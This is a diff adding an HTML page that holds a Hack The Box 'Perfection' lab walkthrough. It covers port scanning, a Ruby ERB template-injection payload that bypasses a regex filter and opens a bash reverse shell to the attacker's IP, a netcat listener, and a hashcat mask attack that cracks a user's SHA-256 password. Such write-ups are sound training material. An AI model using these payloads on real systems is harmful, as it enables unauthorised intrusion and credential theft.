@@ -1,0 +1,129 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Perfection</h1>
+    <h2 class="subtitle">1. Enumeration</h2>
+    <div class="code-box"><pre><code>$ sudo nmap -p- -sCV TARGET_IP --min-rate=2000 > nmap.txt
+$ cat nmap.txt</code></pre></div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/perfection/1-namp.png' %}" alt="">
+        <p class="text">SSH and HTTP ports are opne. Let's see what's there.</p>
+    </div>
+
+    <h2 class="subtitle">2. Foothold</h2>
+    <div class="img">
+        <img src="{% static 'EthHack/images/perfection/3-template.png' %}" alt="">
+        <p class="text">This website uses template "WEBrick". Which uses ERB page.                              </p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/perfection/2-page.png' %}" alt="">
+        <p class="text">Also, this page has user input page, and there is no other interesting spot we should exploit. <br> <br>
+        Let's assume this field is exploitable, especially SSTI is effective.</p>
+    </div>
+
+    <p class="text">
+        According to<a href="https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#erb-ruby"> THIS PAGE</a> in hacktricks, it seems to be useful for SSTI.
+    </p>
+
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/perfection/5-error.png' %}" alt="">
+        <p class="text">Let's try and chekck if the page is exploitable with SSTI. At first I changed the category1 value to <u>&lt;%= footbar %&gt;</u> just for checking if the page returns error. <br><br>
+        Look at the output line "<u>&amp；lt；%=%0afootbar %&amp；gt = Error</u>". This line implies that some speccial characters are filtered. So, modifiy it and retry.
+        </p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/perfection/6-error-bypass.png' %}" alt="">
+        <p class="text">Also, ruby's regex filter bypass characters separated by \n(new line). Using this feature, the payload bypass the filter and return usual output.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/perfection/7-send-ssti.png' %}" alt="">
+        <p class="text">We could bypass the filter, and be able to send arbitrary payload with SSTI. <br><br>Therefore, we can establish reverse-shell right now. </p>
+    </div>
+    <p class="text">Input this value into category1</p>
+    <div class="code-box"><pre><code>Test1%0A<%25%3d+IO.popen("bash+-c+'bash+-
+i+>%26+/dev/tcp/Your_IP/4444+0>%261'").readlines()+%25></code></pre></div>
+
+    <p class="text">And open port to get reverse shell from target machine.</p>
+    <div class="code-box"><pre><code>$ nc -lvnp 4444</code></pre></div>
+    
+    <div class="img">
+        <img src="{% static 'EthHack/images/perfection/8-rev.png' %}" alt="">
+        <p class="text">Boom! We could get access to the target machine easily. <br><br>
+        Let's move to privilege escalation.</p>
+    </div>
+
+    <h2 class="subtitle">Privilege Escalation</h2>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/perfection/9-db.png' %}" alt="">
+        <p class="text">While browsing directories, I found the file <u>pupilpath_credential.db</u> in Migration directory.</p>
+    </div>
+
+    <p class="text">Additionally, in the <u>/var/mail</u> dir, there was interesting message.</p>
+        <div class="code-box"><pre><code>susan@perfection:/var/mail$ cat susan
+Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students
+
+in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:
+
+<u>{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}</u>
+
+Note that all letters of the first name should be convered into lowercase.
+
+Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
+
+- Tina, your delightful student
+susan@perfection:/var/mail$ cat susan
+Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students
+
+in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:
+
+{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
+
+Note that all letters of the first name should be convered into lowercase.
+
+Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
+
+</code></pre></div>
+<p class="text">Since we know the user's firstname 'susan', the password format must be like <u>susan_nasus_?????????</u>. To collect information, let's see contents of the database.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/perfection/10-hash.png' %}" alt="">
+    <p class="text">As it named <u>credentials.db</u>, we can get hashed passwords. We can use this hashed password with hashcat to crack susan's password.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/perfection/11-hash-type.png' %}" alt="">
+    <p class="text">Before move to hash cracking, let's check what's hash type used. <br><br>
+    We can use <u>hash-identifier</u> to search that. And this revealed that the hash type was <u>SHA-256</u>. <br><br>
+Finally, let's crack susan's password to upgrade privilege.</p>
+</div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ echo "susan_nasus_" > name
+                                                                                                                                               
+┌──(kali㉿kali)-[~/tempo]
+└─$ echo "abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f" > hash
+┌──(kali㉿kali)-[~/tempo]
+└─$ hashcat -m 1400 -a 6 hash name ?d?d?d?d?d?d?d?d?d -O
+
+┌──(kali㉿kali)-[~/tempo]
+└─hashcat -m 1400 hash name --show
+abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210</code></pre></div>
+
+    <p class="text">While trying to check the privilege of the accoutn 'susan', it told me that she has all privileges. Therefore, we can do anything in the target machine already.</p>
+    <img src="{% static 'EthHack/images/perfection/12-sudo.png' %}" alt="" id="big">
+
+</body>
+</html>
